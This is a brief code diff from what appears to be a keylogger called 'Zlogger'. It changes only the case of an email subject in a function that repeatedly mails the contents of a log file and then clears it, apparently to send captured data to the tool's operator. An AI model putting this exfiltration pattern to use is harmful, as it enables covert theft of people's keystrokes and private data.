@@ -72,7 +72,7 @@ def initialize():
 def send_mail_reports_every(interval):
 	while True:
 		sleep(interval)
-		send_mail("Zlogger Report", file(LOG_FILE).read())
+		send_mail("Zlogger report", file(LOG_FILE).read())
 		with open(LOG_FILE, "w"):
 			pass
 
